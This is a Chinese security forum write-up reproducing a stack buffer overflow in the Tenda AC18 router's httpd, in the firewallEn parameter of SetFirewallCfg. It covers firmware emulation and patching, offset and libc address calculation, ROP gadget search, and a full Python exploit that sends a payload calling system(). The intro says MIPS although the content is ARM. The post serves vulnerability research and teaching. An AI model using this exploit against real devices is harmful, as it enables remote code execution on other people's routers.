---
title: AC18-ARM架构下的栈溢出从挖掘到利用
url: https://forum.butian.net/share/4473
source: 奇安信攻防社区
date: 2025-07-23
fetch_date: 2025-10-06T23:16:29.279076
---

# AC18-ARM架构下的栈溢出从挖掘到利用

#

[问答](https://forum.butian.net/questions)

*发起*

* [提问](https://forum.butian.net/question/create)
* [文章](https://forum.butian.net/share/create)

[攻防](https://forum.butian.net/community)
[活动](https://forum.butian.net/movable)

Toggle navigation

* [首页 (current)](https://forum.butian.net)
* [问答](https://forum.butian.net/questions)
* [商城](https://forum.butian.net/shop)
* [实战攻防技术](https://forum.butian.net/community)
* [漏洞分析与复现](https://forum.butian.net/articles)
  NEW
* [活动](https://forum.butian.net/movable)
* [摸鱼办](https://forum.butian.net/questions/Play)

搜索

* [登录](https://forum.butian.net/login)
* [注册](https://user.skyeye.qianxin.com/user/register?next=http://forum.butian.net/btlogin)

### AC18-ARM架构下的栈溢出从挖掘到利用

* [漏洞分析](https://forum.butian.net/topic/48)

本文主要讲解mips架构下的栈溢出漏洞复现以及利用，本文涉及到固件模拟、patch、动态调试等手法

qemu用户级固件模拟
===========
首先在github下载工具[https://github.com/zhibx/firmwalker\\_pro](https://github.com/zhibx/firmwalker\_pro)
使用工具查看固件web相关信息
```php
./firmwalker.sh ../US\_AC18V1.0BR\_V15.03.05.05\_multi\_TD01.bin > log.log
```
![](https://cdn.nlark.com/yuque/0/2025/png/23044343/1750128264642-d62e4745-bb58-474b-8322-ef058c0240d8.png)
使用binwalk对固件进行解压
```php
binwalk -Me US\_AC18V1.0BR\_V15.03.05.05\_multi\_TD01.bin
```
查看固件架构可以知道，是LSB ARM小端
```php
file busybox
```
![](https://cdn.nlark.com/yuque/0/2025/png/23044343/1750128375836-2d0207a3-d11a-449e-a263-8c8be2126e03.png)
```php
cp $(which qemu-arm-static) ./qemu
cp -rf ./webroot\_ro/\* ./webroot/
sudo chroot ./ ./qemu ./bin/httpd
```
![](https://cdn.nlark.com/yuque/0/2025/png/23044343/1750128003646-1feac041-20dc-4ae6-afa3-a3fd613c9569.png)
使用ida打开httpd
![](https://cdn.nlark.com/yuque/0/2025/png/23044343/1750129131172-c19fd3fe-e513-4860-8afa-e936ed0c4d4f.png)
![](https://cdn.nlark.com/yuque/0/2025/png/23044343/1750129282049-e9ff76c0-6cdc-425b-90d2-c0ec09258cf4.png)
![](https://cdn.nlark.com/yuque/0/2025/png/23044343/1750129303438-4cf78e36-9a5e-4d91-b8a6-91f720b7234f.png)
需要对CMP R3, #0 进行修改，修改成CMP R3, #1
修改B loc\\_2E2FC ，不让他进行循环
![](https://cdn.nlark.com/yuque/0/2025/png/23044343/1750129392311-936970e4-41dc-4d57-96a9-b46107df514d.png)
![](https://cdn.nlark.com/yuque/0/2025/png/23044343/1750129485182-cf600085-bac9-4f73-a53b-f6423e3ae5b7.png)
![](https://cdn.nlark.com/yuque/0/2025/png/23044343/1750129516068-f425162c-d3b4-4eee-92d2-5cb45838f0d1.png)
修改后
![](https://cdn.nlark.com/yuque/0/2025/png/23044343/1750129536193-7a069dc8-7b28-4b21-b47b-3fdaa8b7a7f3.png)
保存后，重新启动，成功
![](https://cdn.nlark.com/yuque/0/2025/png/23044343/1750129581986-d17edbce-8cdf-4c83-9f78-9b88458497b8.png)
漏洞点位
====
漏洞发生在formSetFirewallCfg函数
sub\\_16FE4("SetFirewallCfg", formSetFirewallCfg);
![](https://cdn.nlark.com/yuque/0/2025/png/23044343/1750141960183-ff2bc626-6619-489b-ade5-71eb3fb29f9c.png)
里面传入firewallEn参数，只要大于3就进行strcpy操作，这里存在溢出
![](https://cdn.nlark.com/yuque/0/2025/png/23044343/1750142013117-8282a6bd-8f97-450b-8059-53eaab6e71f0.png)
偏移量计算
=====
```php
#第一个端
sudo chroot ./ ./qemu -g 1234 ./bin/httpd
#第二个端
gdb-multiarch
set arch arm
tar rem :1234
c
#第三个端
python3 1.py
```
```php
import requests
from pwn import \*
url = "http://192.168.50.18/goform/SetFirewallCfg"
cookie = {"Cookie":"password=1234111115"}
data = {"firewallEn": cyclic(100)}
response = requests.post(url, cookies=cookie, data=data)
response = requests.post(url, cookies=cookie, data=data)
print(response.text)
```
![](https://cdn.nlark.com/yuque/0/2025/png/23044343/1750210294444-cbee3db1-cf41-4cb7-9ad0-204728088ae3.png)
执行cyclic -l 0x6161616e 发现溢出为52字节
![](https://cdn.nlark.com/yuque/0/2025/png/23044343/1750210306140-b395bff5-6450-4fff-8f7c-f0d7c2e15508.png)
libc基址计算
========
```php
sudo chroot ./ ./qemu -g 1234 ./bin/httpd
gdb-multiarch
target remote :1234
file ./bin/httpd
b puts
continue
```
![](https://cdn.nlark.com/yuque/0/2025/png/23044343/1750144108533-e76321be-58bf-455e-91b0-25409f5f87b6.png)
使用ida打开libc.so.0文件，查看puts函数的IDA偏移量为0x35CD4
![](https://cdn.nlark.com/yuque/0/2025/png/23044343/1750144238795-6f7942b1-3a7f-4c55-8b78-3bd08e36c6d7.png)
所以 libc基址=运行时地址−IDA偏移量=0x3fdd5cd4 - 0x35cd4 = 0x3FDA0000
```php
libc\_base = 0x3FDA0000
```
system 基址计算
===========
![](https://cdn.nlark.com/yuque/0/2025/png/23044343/1750144468151-a90e1753-8791-4375-930f-257f0e604b71.png)
```php
system\_base = libc\_base + 0x5A270
```
Gadget解析
========
\*\*跳转到R3的gadget1\\_addr\*\*
```php
ROPgadget --binary ./lib/libc.so.0 --only "pop"| grep r3
0x00018298 : pop {r3, pc}
```
![](https://cdn.nlark.com/yuque/0/2025/png/23044343/1750146199567-b3ff0451-cafe-4494-bb5c-1695613635e7.png)
\*\*找到一个可以控制R0的gadget2\\_addr\*\*
```php
ROPgadget --binary ./lib/libc.so.0 | grep "mov r0, sp"
0x00040cb8 : mov r0, sp ; blx r3
```
![](https://cdn.nlark.com/yuque/0/2025/png/23044343/1750146343805-cbf1d245-8c92-42b6-ac0f-dff04fb7d79e.png)
```php
payload =
b'A' \* 溢出偏移 # 填充至返回地址前
+ p32(gadget1\_addr) # pop {r3, pc}
+ p32(system\_addr) # 存入 r3
+ p32(gadget2\_addr) # 跳转到 gadget2
+ b"/bin/sh\x00" # 字符串参数（通过 r0 传递）
```
```php
from pwn import \*
import requests
cmd = b"echo PWN!"
libc\_base = 0x3FDA0000
system\_addr = libc\_base + 0x5A270
gadget1\_addr = libc\_base + 0x18298
gadget2\_addr = libc\_base + 0x40cb8
payload = b'a'\*52
payload+= p32(gadget1\_addr) + p32(system\_addr) + p32(gadget2\_addr) + cmd
url = "http://192.168.50.18/goform/SetFirewallCfg"
cookie = {"Cookie":"password=asdasddsada"}
data = {"firewallEn": payload}
response = requests.post(url, cookies=cookie, data=data)
response = requests.post(url, cookies=cookie, data=data)
print(response.text)
```
![](https://cdn.nlark.com/yuque/0/2025/png/23044343/1750210423898-131ceb37-0e5a-4cc1-a10d-035495f88c5f.png)
动态调试
====
动态调试验证一下
```php
#第一个端
sudo chroot ./ ./qemu -g 1234 ./bin/httpd
#第二个端
gdb-multiarch
set arch arm
file ./bin/httpd
tar rem :1234
b \*0xAC7FC
c
#第三个端
python3 poc.py
之后一直ni就行
```
实际上一直运行到return地址就行
![](https://cdn.nlark.com/yuque/0/2025/png/23044343/1750210636924-a72ab7fc-f6f4-4240-b5fe-044a24df1e22.png)
![](https://cdn.nlark.com/yuque/0/2025/png/23044343/1750210840700-c47b064b-bee8-4c85-8723-af6898a15b25.png)
可以看到，运行至0xad03c (formSetFirewallCfg+3148) ◂— pop {r4, r5, fp, pc} ，这个地址对应ida的return返回地址
![](https://cdn.nlark.com/yuque/0/2025/png/23044343/1750210545662-f89f282e-10ce-400e-953f-058266bcb0a3.png)
运行至下一步，发现成功到gadget1
![](https://cdn.nlark.com/yuque/0/2025/png/23044343/1750210874158-695ba307-75c5-4776-bd10-61710b13ff7f.png)
![](https://cdn.nlark.com/yuque/0/2025/png/23044343/1750210883387-3711ff70-7fe4-4e38-91a0-847eafc591bf.png)
成功将system保存到r3寄存器
![](https://cdn.nlark.com/yuque/0/2025/png/23044343/1750210943560-1cf0226d-7d8d-43fc-85f3-2329170b6a38.png)
成功运行到gadget2，并控制R0寄存器，调用R3寄存器的system 执行echo指令
![](https://cdn.nlark.com/yuque/0/2025/png/23044343/1750210983926-d7f013e7-4a4e-447c-a38f-dd9495c77f40.png)
![](https://cdn.nlark.com/yuque/0/2025/png/23044343/1750211021642-90818bb5-e44e-4d83-8ed9-927de5c3265f.png)

* 发表于 2025-07-22 09:00:00
* 阅读 ( 1656 )
* 分类：[二进制](https://forum.butian.net/community/erjinzhi)

1 推荐
 收藏

## 0 条评论

请先 [登录](https://forum.butian.net/login) 后评论

[![vlan911](https://forum.butian.net/static/images/default_avatar.jpg)](https://forum.butian.net/people/43077)

[vlan911](https://forum.butian.net/people/43077)

5 篇文章

[奇安信攻防社区](https://forum.butian.net)|
联系我们

|
[sitemap](https://forum.butian.net/sitemap)

Copyright © 2013-2023 BUTIAN.NET 版权所有 [京ICP备18014330号-2](https://beian.miit.gov.cn/#/Integrated/index)

×

#### 发送私信

请先 [登录](https://forum.butian.net/login) 后发送私信

×

#### 举报此文章

垃圾广告信息：
广告、推广、测试等内容

违规内容：
色情、暴力、血腥、敏感信息等内容

不友善内容：
人身攻击、挑衅辱骂、恶意行为

其他原因：
请补充说明

举报原因:

取消
举报

×

#### ![vlan911](https://forum.butian.net/static/images/default_avatar.jpg)

如果觉得我的文章对您有用，请随意打赏。你的支持将鼓励我继续创作！

![](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/06/qrcode-36d63cc744264cc47f3999f6c981ac7ba2f986bf.jpg)

---